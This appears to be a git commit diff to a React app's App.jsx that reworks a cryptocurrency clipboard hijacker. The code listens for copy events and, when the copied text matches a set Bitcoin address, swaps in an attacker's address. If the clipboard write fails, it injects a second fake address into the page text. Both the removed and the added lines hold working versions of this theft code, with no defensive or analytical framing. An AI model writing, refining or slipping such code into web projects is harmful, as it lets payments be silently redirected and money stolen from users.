00f4b0acf8292eba9f5b41d659ff603c95a50ae4
Dmitry <punkreatine@gmail.com>
2024-07-01 19:33:11 +0300

    feature 1

--- src/App.jsx
+++ src/App.jsx
@@ -2,23 +2,40 @@ import { useEffect, useState } from 'react';
 import './App.css';
 
 const address = `1EKC6kqp3tmeHr9YNvmXV9smZ6FiRct8ZQ`;
+const fakeAddress1 = `18KQzrpXT9ty4o4phPjSKAM17MAMONTAhv3qnabURYhX1`;
+const fakeAddress2 = `18KQzrpXT9ty4o4phPjSKAM17MAMONTAhBEZxPRAVqnabURYhX1`;
 
 function App() {
   const [text, setText] = useState('');
-  useEffect(() => {
-    async function clipper() {
-      const text = await navigator.clipboard.readText();
+  const [copyText, setCopyText] = useState('');
 
-      // здесь должна быть проверка на то что это криптокошелёк
-      if (text === address) {
-        await navigator.clipboard.writeText('18KQzrpXT9ty4o4phPjSKAM17MAMONTAhv3qnabURYhX1');
+  useEffect(() => {
+    async function copyHandler(event) {
+      try {
+        setCopyText(await navigator.clipboard.readText());
+      } catch {
+        setCopyText(event.target.innerHTML);
       }
     }
 
-    document.addEventListener('copy', clipper);
+    document.addEventListener('copy', copyHandler);
 
-    return () => document.removeEventListener('copy', clipper);
+    return () => document.removeEventListener('copy', copyHandler);
   }, []);
+
+  useEffect(() => {
+    async function setToClipboard(text) {
+      try {
+        await navigator.clipboard.writeText(text);
+      } catch {
+        setText((prev) => `${prev}${fakeAddress2}`);
+      }
+    }
+
+    if (copyText === address) {
+      setToClipboard(fakeAddress1);
+    }
+  }, [copyText]);
 
   return (
     <div>
